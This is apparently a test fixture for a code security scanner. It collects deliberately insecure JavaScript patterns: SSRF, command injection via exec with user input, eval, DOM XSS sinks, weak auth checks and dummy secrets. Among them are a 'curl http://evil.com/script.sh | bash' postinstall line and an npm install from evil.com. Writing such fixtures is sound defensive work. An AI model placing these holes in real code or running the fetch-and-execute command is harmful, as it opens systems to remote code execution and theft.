/**
 * Launchioo FULL SECURITY COVERAGE TEST FILE
 * Purpose: Validate detection of all rule categories + context-aware scoring
 * DO NOT USE IN PRODUCTION
 */

// ==========================
// 🔴 CRITICAL: INPUT SOURCES
// ==========================

const userInput = process.argv[2];
const query = userInput;
const req = { query: { url: userInput } };

// ==========================
// 🔴 CRITICAL: SSRF TESTS
// ==========================

// direct SSRF
fetch(req.query.url);

// axios SSRF pattern
axios.get(userInput);

// http.request SSRF
http.request(userInput);

// nested SSRF pattern
function load(url) {
  return fetch(url);
}
load(req.query.url);

// ==========================
// 🔴 CRITICAL: HTTP / WS / PROTOCOLS
// ==========================

// insecure HTTP (auth context)
fetch("http://auth.example.com/login");

// websocket insecure
const socket = new WebSocket("ws://insecure.example.com/socket");

// redirect chain risk
window.location = "http://evil.com";

// dynamic URL fetch
fetch(userInput);

// ==========================
// 🔴 CRITICAL: AUTH BYPASS PATTERNS
// ==========================

function checkAuth(user) {
  if (user.role) return true; // weak auth check
  return false;
}

// missing permission check
if (req.user) {
  allowAccess();
}

// insecure cookie handling
document.cookie = "session=abc123; HttpOnly=false";

// ==========================
// 🔴 CRITICAL: SECRETS / TOKENS
// ==========================

const apiKey = "sk_live_1234567890";
const githubToken = "ghp_1234567890abcdef1234567890abcdef";
const jwtToken =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload.signature";

// environment leak simulation
console.log(process.env.GITHUB_TOKEN);

// ==========================
// 🔴 CRITICAL: CODE EXECUTION
// ==========================

eval("console.log('launchioo-test')");
new Function("return process.env")();

// command injection
const { exec } = require("child_process");
exec("ping " + userInput);

// ==========================
// 🟠 HIGH: DOM XSS / INJECTION
// ==========================

document.body.innerHTML = "<div>" + userInput + "</div>";

document.write(userInput);

element.insertAdjacentHTML("beforeend", userInput);

// ==========================
// 🟡 MEDIUM: DEBUG / DEV CODE
// ==========================

debugger;
console.log("debug info");
console.log(userInput);

// ==========================
// 🟡 MEDIUM: WEAK CRYPTO (CONTEXT TEST)
// ==========================

// should be LOW/MEDIUM unless used in auth context
const sessionId = Math.random();

// insecure hashing pattern
const hash = md5(userInput);

// ==========================
// 🟢 LOW: GENERIC LOGGING
// ==========================

console.log("user:", userInput);
console.log("request received");

// ==========================
// 🧪 TAINT FLOW TEST (IMPORTANT)
// ==========================

// userInput → sink chain
function sanitize(x) {
  return x;
}

const unsafe = sanitize(userInput);

document.body.innerHTML = unsafe;
exec("ls " + unsafe);

// ==========================
// 🧪 SSRF + AUTH COMBO (CRITICAL TEST)
// ==========================

fetch("http://internal-api.local/admin?token=" + userInput);

// ==========================
// 🧪 DEPENDENCY / INSTALL SIGNALS (STATIC)
// ==========================

// suspicious install patterns (scanner should flag conceptually)
const install = "npm install https://evil.com/package.git";

// postinstall risk simulation
process.env.POSTINSTALL = "curl http://evil.com/script.sh | bash";

// ==========================
// 🧪 CONFIG / INFRA LEAKS
// ==========================

const config = {
  webhook: "http://webhook.site/evil",
  secret: "sk_test_123",
};

// ==========================
// END OF TEST FILE
// ==========================
